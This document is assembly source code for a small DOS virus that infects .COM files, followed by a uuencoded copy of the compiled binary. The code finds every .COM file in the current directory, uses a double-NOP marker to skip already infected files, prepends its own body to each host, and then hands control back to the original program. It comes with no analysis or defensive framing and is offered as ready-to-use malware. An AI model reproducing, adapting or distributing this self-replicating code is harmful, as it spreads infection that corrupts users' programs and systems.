.model  tiny
.code
org     100h
kkk:
    nop ; ID
    nop ; ID

    mov cx,80h
    mov si,0080h
    mov di,0ff7fh
    rep movsb       ; save param

    lea ax,begp     ; begin prog
    mov cx,ax
        sub     ax,100h
        mov     ds:[0fah],ax   ; len VIR
    add cx,fso
        mov     ds:[0f8h],cx   ; begin buffer W
        ADD     CX,AX
        mov     ds:[0f6h],cx   ; begin buffer R

        mov     cx,ax
    lea si,kkk
        mov     di,ds:[0f8h]
RB:     REP     MOVSB           ; move v

        stc

        LEA     DX,FFF
        MOV     AH,4EH
        MOV     CX,20H
        INT     21H     ;  find first

    or  ax,ax
    jz  LLL
    jmp done

LLL:
    MOV     AH,2FH
        INT     21H     ; get DTA

    mov ax,es:[bx+1ah]
        mov     ds:[0fch],ax   ; size
    add bx,1eh
        mov     ds:[0feh],bx   ; point to name

    clc
    mov ax,3d02h
    mov dx,bx
    int 21h     ; open file

    mov bx,ax
    mov ah,3fh
        mov     cx,ds:[0fch]
        mov     dx,ds:[0f6h]
    int 21h     ; read file

    mov bx,dx
    mov ax,[bx]
    sub ax,9090h
    jz  fin


        MOV     AX,ds:[0fch]
        mov     bx,ds:[0f6h]
        mov     [bx-2],ax      ; correct old len

    mov ah,3ch
    mov cx,00h
        mov     dx,ds:[0feh]   ; point to name
    clc
    int 21h     ; create file

    mov bx,ax       ; #
    mov ah,40h
        mov     cx,ds:[0fch]
        add     cx,ds:[0fah]
        mov     DX,ds:[0f8h]
    int 21h     ; write file


    mov ah,3eh
    int 21h     ;close file

FIN:
    stc
    mov ah,4fh
    int 21h     ; find next

    or  ax,ax
    jnz done

        JMP     lll

DONE:

    mov cx,80h
    mov si,0ff7fh
    mov di,0080h
    rep movsb       ; restore param

        MOV     AX,0A4F3H
        mov     ds:[0fff9h],ax
    mov al,0eah
    mov ds:[0fffbh],al
    mov ax,100h
    mov ds:[0fffch],ax
    lea si,begp
    lea di,kkk
    mov ax,cs
    mov ds:[0fffeh],ax
    mov kk,ax
    mov cx,fso

    db  0eah
        dw      0fff9h
kk  dw  0000h

fff db  '*?.com',0
fso dw  0005h   ; ----- alma mater


begp:
    MOV     AX,4C00H
    int     21h     ; exit

end kkk

begin 775 bjec-3.com
MD)"Y@`"^@`"_?__SI+CG`8O(+0`!H_H``P[E`8D.^``#R(D.]@"+R+X``8L^
M^`#SI/FZW@&T3KD@`,TA"\!T`^MID+0OS2$FBT<:H_P`@\,>B1[^`/BX`CV+
MT\TAB]BT/XL._`"+%O8`S2&+VHL'+9"0="RA_`"+'O8`B4?^M#RY``"+%OX`
M^,TAB]BT0(L._``##OH`BQ;X`,TAM#[-(?FT3\TA"\!U`NN8N8``OG__OX``
M\Z2X\Z2C^?^PZJ+[_[@``:/\_[[G`;\``8S(H_[_H]P!BP[E`>KY_P``*C\N
+8V]M``4`N`!,S2$`
`
end
